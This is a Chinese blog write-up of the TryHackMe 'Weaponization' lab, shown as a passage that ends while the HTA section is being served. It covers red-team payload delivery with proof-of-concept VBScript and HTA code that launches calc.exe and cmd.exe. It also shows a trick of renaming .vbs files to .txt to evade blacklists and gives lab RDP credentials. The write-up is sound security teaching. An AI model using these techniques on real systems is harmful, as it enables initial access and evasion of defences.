
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>THM-Weaponization - hybcx's blog</title>

  
    <meta name="description" content="0x01 介绍 在这个房间里，我们将讨论用于武器化的不同技术。  什么是Weaponization 武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码[1]。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。 大多数组织都运行 Windows 操作系统，这将成为可能的目标。组织的环境策略通常会阻止下载和执行">
<meta property="og:type" content="article">
<meta property="og:title" content="THM-Weaponization">
<meta property="og:url" content="http://hybcx.xyz/2024/07/12/thm-weaponization/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 介绍 在这个房间里，我们将讨论用于武器化的不同技术。  什么是Weaponization 武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码[1]。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。 大多数组织都运行 Windows 操作系统，这将成为可能的目标。组织的环境策略通常会阻止下载和执行">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135294.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135296.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135297.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135298.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135299.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135300.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135301.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135302.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135303.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135304.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135305.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135306.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135307.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135308.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135309.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135310.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135311.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135312.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135313.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135314.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135315.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135316.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135317.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135318.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135319.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135320.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135321.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135322.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135323.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135324.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135325.png">
<meta property="article:published_time" content="2024-07-12T10:37:00.000Z">
<meta property="article:modified_time" content="2024-07-15T08:11:31.862Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="tryhackme">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135294.png">
  
  
  
  <meta name="keywords" content="tryhackme">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/07/25/thm-windows-api-jie-shao/"><span class="title">THM-Windows-API介绍</span></a><a class="item title" href="/2024/07/24/thm-windows-nei-he/"><span class="title">THM-Windows内核</span></a><a class="item title" href="/2024/07/20/thm-shu-ju-xie-lu/"><span class="title">THM-数据泄露</span></a><a class="item title" href="/2024/07/21/linux-ti-quan-zong-jie/"><span class="title">Linux提权总结</span></a><a class="item title" href="/2024/07/16/thm-enumeration/"><span class="title">THM-Enumeration</span></a><a class="item title" href="/2024/07/16/thm-dang-qian-tai-shi/"><span class="title">THM-当前态势</span></a><a class="item title" href="/2024/02/10/thm-linux-quan-xian-ti-sheng/"><span class="title">THM-Linux权限提升</span></a><a class="item title" href="/2024/02/14/thm-basic-pentesting/"><span class="title">THM-Basic Pentesting</span></a><a class="item title" href="/2024/07/20/linux-ti-quan-xue-xi-yi/"><span class="title">Linux提权学习之rbash逃逸</span></a><a class="item title" href="/2023/08/07/qian-xi-mu-lu-chuan-yue/"><span class="title">浅析目录穿越</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/tryhackme/">tryhackme</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-12T10:37:00.000Z">2024-07-12</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-15T08:11:31.862Z">2024-07-15</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>THM-Weaponization</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-介绍">0x01 介绍</h1>
<p>在这个房间里，我们将讨论用于武器化的不同技术。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135294.png" alt="image-20240712185929529"></p>
<h2 id="什么是weaponization">什么是Weaponization</h2>
<p>武器化是网络杀伤链模型的第二阶段。在此阶段，攻击者使用可交付的有效负载（例如 Word 文档、PDF 等）生成并开发自己的恶意代码<a target="_blank" rel="noopener" href="https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html">[1]</a>。武器化阶段旨在使用恶意武器来利用目标机器并获得初始访问权限。</p>
<p>大多数组织都运行 Windows 操作系统，这将成为可能的目标。组织的环境策略通常会阻止下载和执行 .exe 文件以避免安全违规。因此，红队成员依赖于构建通过各种渠道发送的自定义有效负载，例如网络钓鱼活动、社会工程、浏览器或软件开发、USB 或 Web 方法。</p>
<p>下图是武器化的示例，其中使用精心制作的自定义 PDF 或 Microsoft Office 文档来传递恶意负载。自定义有效负载配置为连接回红队基础设施的C2环境。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135296.png" alt="image-20240712190642231"></p>
<p>有关红队工具包的更多信息，请访问以下内容：包含所有内容的 <a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development">GitHub 存储库</a>，包括初始访问、有效负载开发、交付方法等。</p>
<p>大多数组织都会阻止或监视其受控环境中 .exe 文件的执行。因此，红队成员依赖于使用其他技术执行有效负载，例如内置 Windows 脚本技术。因此，本任务重点关注各种流行且有效的脚本编写技术，包括：</p>
<ul>
<li>The Windows Script Host (WSH)</li>
<li>An HTML Application (HTA)</li>
<li>Visual Basic Applications (VBA)</li>
<li>PowerShell (PSH)</li>
</ul>
<p>让我们在下一个任务中部署目标机器，并在后续任务中开始使用Windows Script Host技术！</p>
<h1 id="0x02-部署windows机器">0x02 部署Windows机器</h1>
<p>如果您更喜欢通过远程桌面协议 (RDP) 连接，请首先确保您已连接到 VPN。然后需要 RDP 客户端连接到连接的 Windows 10 计算机。您可以使用 xfreerdp 工具进行连接，该工具可在 TryHackMe AttackBox 上找到。</p>
<p>要通过 xfreerdp 连接，请使用以下命令：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ xfreerdp /<span class="hljs-attribute">v</span>:<span class="hljs-number">10.10</span>.<span class="hljs-number">13.20</span> /<span class="hljs-attribute">u</span>:thm /<span class="hljs-attribute">p</span>:TryHackM3 +clipboard</code></pre>
<p>用户名：thm 密码：TryHackM3</p>
<p>这里我是用GUI的remmina连接</p>
<h1 id="0x03-windows-scripting-host-wsh">0x03 Windows Scripting Host (WSH)</h1>
<h2 id="wsh">WSH</h2>
<p>Windows 脚本主机是一个内置的 Windows 管理工具，它运行批处理文件以自动执行和管理操作系统内的任务。</p>
<p>它是一个Windows本机引擎，cscript.exe（用于命令行脚本）和wscript.exe（用于UI脚本），负责执行各种Microsoft Visual Basic脚本（VBScript），包括vbs和vbe。有关 VBScript 的更多信息，<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/VBScript">请访问此处</a>。需要注意的是，Windows 操作系统上的 VBScript 引擎以与普通用户相同级别的访问和权限来运行和执行应用程序；因此，它对红队队员很有用。</p>
<p>现在让我们编写一个简单的 VBScript 代码来创建一个 Windows 消息框，显示欢迎使用 THM 消息。确保将以下代码保存到文件中，例如 hello.vbs.</p>
<pre><code class="hljs VBSCRIPT"><span class="hljs-keyword">Dim</span> message 
message = <span class="hljs-string">"Welcome to THM"</span>
MsgBox message</code></pre>
<p>在第一行中，我们使用 Dim 声明了消息变量。然后我们在消息变量中存储一个字符串值Welcome to THM。在下一行中，我们使用 MsgBox 函数来显示变量的内容。有关 MsgBox 函数的更多信息，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN">请访问此处</a>。然后，我们使用wscript来运行并执行hello.vbs的内容，结果，将弹出一条Windows消息，其中包含Welcome to THM消息。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135297.png" alt="image-20240712192801895"></p>
<p>现在让我们使用 VBScript 来运行可执行文件。下面的vbs代码是调用Windows计算器，证明我们可以使用Windows本机引擎（WSH）执行.exe文件。</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Set</span> shell = <span class="hljs-title class_">WScript</span>.<span class="hljs-title class_">CreateObject</span>(<span class="hljs-string">"Wscript.Shell"</span>)
shell.<span class="hljs-title class_">Run</span>(<span class="hljs-string">"C:\Windows\System32\calc.exe "</span> &amp; <span class="hljs-title class_">WScript</span>.<span class="hljs-property">ScriptFullName</span>),<span class="hljs-number">0</span>,<span class="hljs-title class_">True</span></code></pre>
<p>我们使用 CreateObject 创建 WScript 库的对象来调用执行负载。然后，我们利用 Run 方法来执行有效负载。对于此任务，我们将运行 Windows 计算器calc.exe。</p>
<p>要执行 vbs 文件，我们可以使用 wscript 运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;wscript c:\Users\thm\Desktop\payload.vbs</code></pre>
<p>我们还可以通过 cscript 运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;cscript.exe c:\Users\thm\Desktop\payload.vbs</code></pre>
<p>结果，Windows 计算器将出现在桌面上。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135298.png" alt="image-20240712192833105"></p>
<p>另一个技巧。如果VBS文件被列入黑名单，那么我们可以将文件重命名为.txt文件并使用wscript运行它，如下所示，</p>
<pre><code class="hljs scss">c:\Windows\System32&gt;wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</code></pre>
<p>结果将与执行运行 calc.exe 二进制文件的 vbs 文件一样精确。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135299.png" alt="image-20240712193716207"></p>
<h1 id="0x04-an-html-application-hta">0x04 An HTML Application (HTA)</h1>
<h2 id="html-应用程序">HTML 应用程序</h2>
<p>HTA 代表“HTML 应用程序”。它允许您创建一个可下载文件，其中包含有关如何显示和渲染的所有信息。 HTML 应用程序，也称为 HTA，是包含 JScript 和 VBScript 的动态 HTML 页面。 LOLBINS（Living-of-the-land Binaries）工具mshta用于执行HTA文件。它可以自行执行或从 Internet Explorer 自动执行。</p>
<p>在下面的示例中，我们将在有效负载中使用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ActiveX">ActiveXObject</a> 作为执行 cmd.exe 的概念证明。考虑以下 HTML 代码。</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">	<span class="hljs-keyword">var</span> c= <span class="hljs-string">'cmd.exe'</span></span>
<span class="language-javascript">	<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">'WScript.Shell'</span>).<span class="hljs-title class_">Run</span>(c);</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>然后从Web服务器提供payload.hta，这可以从攻击机器完成，如下所示，</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ python3 -m http.server <span class="hljs-number">8090</span>
Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8090</span> (<span class="hljs-attribute">http</span>://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8090</span>/)</code></pre>
